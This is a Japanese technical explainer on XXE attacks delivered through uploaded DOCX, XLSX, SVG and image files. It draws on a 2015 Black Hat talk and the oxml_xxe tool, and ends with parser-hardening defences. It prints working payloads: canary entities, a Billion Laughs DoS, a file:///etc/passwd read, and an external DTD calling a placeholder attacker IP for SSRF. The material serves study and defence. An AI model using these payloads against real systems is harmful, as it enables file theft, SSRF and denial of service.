## OOXML埋込ツールとBlack Hat原典

XXE（XML External Entity、XML外部実体参照）といえば「XMLを受け取るAPIエンドポイントに悪意ある`<!DOCTYPE>`を送り込む」攻撃を最初に思い浮かべる読者が多いだろう。しかしこの章の主題は、**ユーザーがアップロードした「ファイル」の内部でXMLが解釈される経路**である。DOCXやXLSXのようなオフィス文書、SVG、さらにはJPG/GIF/PDFといった画像・文書フォーマットは、その内部にXMLを抱えている。アプリケーションがそのXMLをサーバ側でパース（構文解析）する瞬間に、そのファイルは丸ごとXXEペイロードの運搬体になりうる。

この経路を体系化し、テストを自動化したのが Will Vandevanter（`@_will_is_`）による **oxml_xxe** ツールと、その発表元である **Black Hat USA 2015** の講演「Exploiting XXE in File Upload Functionality（ファイルアップロード機能におけるXXEの悪用）」である。本節はこの2つを原典として、なぜファイル埋込型XXEが成立するのか、その仕組みレベルの原理を解説する。

### OOXMLとは何か — ファイルの正体はZIP+XML

まず対象フォーマットの内部構造を理解する必要がある。DOCX・PPTX・XLSXが属する **OOXML（Office Open XML、別名 OpenXML / OXML）** は、Microsoftが策定した「開いた」文書フォーマットで、Office 2007以降の既定形式である（Office 2003からも利用可能）。

重要なのは、OOXMLファイルの**実体はZIPアーカイブ**だという点だ。`report.docx`の拡張子を`.zip`に変えて展開すると、複数のXMLファイルとメディア（画像など）が現れる。つまりDOCXは「複数のXML文書を圧縮して1ファイルに束ねたもの」にすぎない。この事実こそが攻撃面（attack surface、攻撃者が触れる入口の広がり）を生む。**アプリがDOCXを処理する = 内部の複数XMLをパースする**、ということだからだ。

Vandevanterのスライドは、OOXMLを解釈するライブラリが辿る**パース順序**を次のように示す。

```
1. /_rels/.rels          … 文書全体の関係(relationship)定義
2. [Content_Types].xml   … 各パーツのMIMEタイプ宣言
3. Default Main Document Part（本体）
     DOCX → /word/document.xml
     PPTX → /ppt/presentation.xml
     XLSX → /xl/workbook.xml
```

パーサはまず`/_rels/.rels`と`[Content_Types].xml`という「メタデータ的なXML」を読み、そこから本体パーツ（`document.xml`等）へ辿る。**つまりXXEの注入先は本体だけではない**。`[Content_Types].xml`や`.rels`も立派なXMLであり、多くのパーサが最初に無条件で読む。防御側がうっかり本体`document.xml`だけをサニタイズしても、先に読まれる`[Content_Types].xml`が素通しなら攻撃は成立する。実際、講演で紹介されたSlackのファイル共有機能のバグは`[Content_Types].xml`の改変で成立した。

> 出典: Exploiting XXE in File Upload Functionality（Will Vandevanter, Black Hat USA 2015 スライド）— https://oxmlxxe.github.io/reveal.js/slides.html

### 最小のXXE — 実体（Entity）の注入

最も基本的な注入は、本体XMLの先頭に**内部DTD（Document Type Definition、文書型定義）**を差し込み、実体（entity、XML内で使える名前付きの置換文字列）を定義することだ。原典のデモはこう始まる。

```xml
<!DOCTYPE root [
  <!ENTITY post "1">
]>
```

これを例えば`/word/document.xml`の冒頭に埋め、本文中で`&post;`と参照すると、パーサはそれを`1`に展開する。ここで「実体が実際に展開されたか（＝DTDと実体参照が有効か）」を確かめる工程を、Vandevanterは **canary testing（カナリアテスト＝毒ガス検知のカナリアのように、危険な機能が生きているかを無害な値で先に探る手法）** と呼ぶ。まず無害な文字列が展開されることを確認し、有効なら次段の外部参照（ファイル読み取りやSSRF）へ進む、という段階的アプローチだ。無闇に致命的なペイロードを送らず、まず反応の有無を見るのは本番非破壊のテスト設計としても理にかなう。

#### 関係ファイルを使ったカナリア

Vandevanterは`.rels`ファイルを使った巧妙なカナリアも示す。`/_rels/.rels`内の`Relationship`要素の`Target`属性（本来は`/word/document.xml`のようなパスを指す）を、実体参照に置き換える。

```xml
<!DOCTYPE root [
  <!ENTITY canary "/word/document.xml">
]>
...
<Relationship Id="rId1"
  Type="...relationships/officeDocument"
  Target="&canary;" />
```

`&canary;`が展開されて元のパスと同じ値になれば、`.rels`がXXE可能なパーサで処理されている証拠になる。**属性値の位置で実体展開が起きるか**を確認できる点がポイントで、CDATA・平文・属性という展開文脈ごとにパーサの挙動が異なるため、XSSやLFIへ発展させる前の下調べに使える。

### 再帰的実体 — Billion Laughs（DoS）

外部通信を一切せずにサービスを停止させる古典が、**再帰的実体展開**による「Billion Laughs（10億の笑い）」攻撃だ。原典のペイロードは次の通り。

```xml
<!DOCTYPE foo [
  <!ENTITY post "1">
  <!ENTITY post1 "&post;&post;">
  <!ENTITY post2 "&post1;&post1;">
  <!ENTITY post3 "&post2;&post2;">
  <!ENTITY post4 "&post3;&post3;">
  <!ENTITY post5 "&post4;&post4;">
]>
<foo>&post5;</foo>
```

**なぜ危険か**：各実体が下位の実体を2回ずつ参照するため、展開量は段ごとに2倍になる。5段で2^5=32だが、原典では例示のため5段に留めているだけで、段数を増やせば`&postN;`は2^N文字へ指数関数的に膨張する。数KBのファイルがメモリ上で数GBに展開され、XMLパーサがメモリを食い潰してプロセスが停止する。ネットワーク接続を必要とせず、パーサの「実体を律儀に全部展開する」という仕様そのものを悪用する点が本質だ。

このDoSはパーサ実装の脆弱性として複数のCVEに結びついている。原典が挙げるのは以下（対象・年・状況を明記する）。

- **Apache POI**（Javaのオフィス文書ライブラリ）: `CVE-2014-3574`, `CVE-2014-3529` — いずれも2014年公開、XML実体展開に起因。修正版あり。
- **docx4j**（Java）, **OpenXML SDK**（.NET）: 同種の実体展開問題。
- **Nokogiri**（Ruby/libxml2ラッパー）: `CVE-2012-6685`（相当）, `CVE-2014-3660` — 外部実体・DTDの扱いに起因。

> 出典: Exploiting XXE in File Upload Functionality（Black Hat USA 2015 スライド）— https://blackhat.com/docs/us-15/materials/us-15-Vandevanter-Exploiting-XXE-Vulnerabilities-In-File-Parsing-Functionality.pdf

### さらなる悪用 — LFI・SSRF・多形式展開

原典後半の「Further Exploitation」は、ファイル埋込XXEの発展形を整理する。カナリアで実体が生きていると分かったら、次の3方向へ展開できる。

#### 1. Webアプリ側での二次被害（XSS / LFI）

展開された実体の値がそのまま画面に反映されれば **XSS**（保存型になりやすい。文書処理結果としてサーバに保存され後で表示されるため）、`SYSTEM`実体で`file:///etc/passwd`等を読めば **LFI（Local File Inclusion、ローカルファイル読み取り）** になる。CDATA・平文・属性という展開文脈ごとにペイロードを調整する必要がある。

#### 2. アウトバウンド接続（SSRF）

外部**PUBLIC DTD**を宣言すると、パーサがそのURLへHTTP取得を試みる。原典の実物はこれだ。

```xml
<!DOCTYPE foo PUBLIC "-//B/A/EN" "http://[IP]">
```

**なぜ通信が起きるか**：`PUBLIC`宣言の第2引数はDTDの「システム識別子」＝取得先URLであり、外部DTD読み込みを許すパーサは律儀にそのURLを取りに行く。攻撃者サーバのIPを指定すれば、標的サーバから攻撃者へアウトバウンド接続が飛ぶ。これは (a) 実体展開結果を直接返さない**ブラインドXXE**でも「通信が来たか」で成否を判定できるカナリアになり、(b) 内部ネットワークへ向ければ **SSRF（Server-Side Request Forgery、サーバに内部宛リクエストを代行させる攻撃）** そのものになる。スライドはこれを`externalTarget`として整理している。

> ⚠️ **未取得の資料**: Black Hat USA 2015 スライドPDF「Exploiting XXE in File Parsing Functionality」は、当初WebFetchでは本文がバイナリ（PDF）として返り直接抽出できませんでした。ただし本節では、ダウンロード済みPDFをローカルでテキスト抽出し、原典スライドの文言（上記ペイロード・CVE番号・パース順序を含む）を直接引用しています。原文スライドはこちらから直接ご覧ください: https://blackhat.com/docs/us-15/materials/us-15-Vandevanter-Exploiting-XXE-Vulnerabilities-In-File-Parsing-Functionality.pdf

#### 3. 別ファイル形式への展開 — PDF / 画像

原典は「XXE in Other File Formats」として、XMLを内部に持つ他フォーマットも列挙する。特に **PDF** は `AR7`（Acrobat系機能）・**XFA**（XML Forms Architecture、PDFフォームをXMLで記述する仕様）・**XMP**（後述）といったXMLベースの構成要素を持ち、そこにXXEを仕込める。

### oxml_xxe ツール — 埋込を自動化する

以上のテストを手作業でやると、ZIPを解いてXMLを書き換え再圧縮…という煩雑な手順を全形式ぶん繰り返すことになる。これを1画面で自動化するのが **BuffaloWill/oxml_xxe** である。GitHubの説明文は端的で、「**A tool for embedding XXE/XML exploits into different filetypes（XXE/XMLエクスプロイトを各種ファイル形式に埋め込むツール）**」とある。

- **対応形式**: DOCX / XLSX / PPTX、ODT / ODG / ODP / ODS（OpenDocument、LibreOffice等の形式）、SVG、生XML、そして **PDF・JPG・GIF**。
- **実装**: Ruby製。Webフレームワーク Sinatra、UIに Bootstrap、テンプレートに Slim を使う。ブラウザで`http://localhost:4567/`を開いて操作する。
- **ペイロード管理**: `payloads.yaml` にXXEペイロード群を定義しておき、GUIから対象ファイルへ選んで注入する。ペイロードを追加・改変したいときはこのYAMLを編集する。

導入は次のいずれか（対象は2024年時点のREADME、Ruby 3.2系依存）。

```bash
# Docker
docker build --tag oxml_xxe .
docker run --name oxml_xxe -p 4567:4567 --rm oxml_xxe

# Ubuntu 手動（依存: libxml2-dev, libxslt-dev, zlib1g-dev, gcc, ruby3.2 等）
gem install bundler && bundle install && ruby server.rb
```

#### 画像フォーマットへの埋込 — XMPという抜け道

「なぜJPGやGIFにXMLを埋められるのか」は、この節で最も原理的に面白い部分だ。鍵は **XMP（Extensible Metadata Platform、Adobe策定のメタデータ規格）** である。XMPは撮影日時や著作権などのメタデータを**XMLで**表現し、JPEG・GIF・PDFなどのファイル内に埋め込む。oxml_xxeはこのXMPメタデータ領域にXXEペイロードを差し込む。

したがって、アプリが「アップロードされた画像のEXIF/XMPメタデータを読む」処理でXMLパーサを使っていれば、`profile.jpg`という一見無害な画像がXXEの運搬体になる。フォーマットが画像だからといってXMLパースと無縁とは限らない、というのが要点だ。関連する著名事例として、oxml_xxeのドキュメントは画像処理系のXXEである `CVE-2016-4264`（ImageMagickのXXE）にも言及している。

> 出典: BuffaloWill/oxml_xxe — https://github.com/BuffaloWill/oxml_xxe

#### 補足: SVGにおけるXXE

SVG（Scalable Vector Graphics）は名前通り**XMLそのもの**で書かれた画像形式だ。ゆえに`<svg>`要素の前に`<!DOCTYPE>`を置くだけでXXEが成立する。アバターやアイコンのアップロードをSVGで受け付け、サーバ側でサムネイル生成やラスタライズのためにSVGをXMLとして解析すると、そこがsink（入力が最終的に実行・解釈される危険な代入先）になる。oxml_xxeがSVGを1形式として扱うのはこのためだ。

### 現実の被害事例

原典が「Bug Bounty」の実例として挙げるのは次の2件で、いずれも「XMLを受け付けるつもりのないアップロード機能」が入口になった点が教訓だ。

- **Slack**: ファイル共有機能で`[Content_Types].xml`の改変により成立。
- **Facebook Careers（採用ページ）の履歴書アップロード**: 2014年Q4、研究者 Mohamed Ramadan による報告。アップロードされたレジュメ（DOCX等）をサーバが解析する経路が突かれた。

### 防御 — なぜ「同じパーサだと思い込む」のが危険か

Vandevanterの結論スライド（Summary Points）は、防御側への最重要メッセージを一言で述べている。

> **サイトのある部分（例: API）でXMLをパースするライブラリと、アップロードファイルをパースするライブラリは同一とは限らない。必ず検証し、設定を確認せよ。**

これが核心だ。多くのチームはAPIの入口だけXXE対策（外部実体・DTD無効化）を施し、「うちのXMLパーサは安全」と思い込む。しかしファイルアップロードの裏側では、Apache POI・docx4j・Nokogiri・ImageMagickといった**別のライブラリが別の設定で**動いており、そこにDTD・外部実体を無効化する設定が入っていないことがある。防御の実務としては次を徹底する。

1. **全経路の棚卸し**: XMLを触りうる全処理（API、ファイル解析、画像メタデータ抽出、SVGラスタライズ）を洗い出し、それぞれで使うパーサとその設定を確認する。
2. **DTD・外部実体の無効化**: 各パーサで外部一般実体・外部パラメータ実体・外部DTD読み込み・`DOCTYPE`自体を無効化する（例: Javaなら`disallow-doctype-decl`を`true`に、`external-general-entities`を`false`に）。
3. **パッチ適用**: 上記CVE群の修正は既に提供済み。オフィス文書・画像処理ライブラリを最新に保つ。
4. **アウトバウンド遮断**: パースを行うサーバから外部への不要な送信をネットワーク側でも遮断し、SSRF/ブラインドXXEの成立条件を潰す。

原典が2015年に鳴らした警鐘は、対策設定が各パーサに標準化されつつある現在でも古びていない。**「ファイル＝ただのデータ」ではなく「ファイル＝実行されうるXMLの束」**という視点を持てるかどうかが、この攻撃面を塞げるかの分かれ目になる。

> 出典: Exploiting XXE in File Upload Functionality（Will Vandevanter, Black Hat USA 2015）公式ページ — http://oxmlxxe.github.io / スライド — https://oxmlxxe.github.io/reveal.js/slides.html

---

**本節のスコープに関する注記**: 本節は防御・検証を目的とした技術解説であり、掲載したペイロード・ツールは自組織の管理下または明示的な許可を得た検証環境でのみ用いること。実在サービスや本番環境への無許可の検証、破壊的手順の実行は行わない。
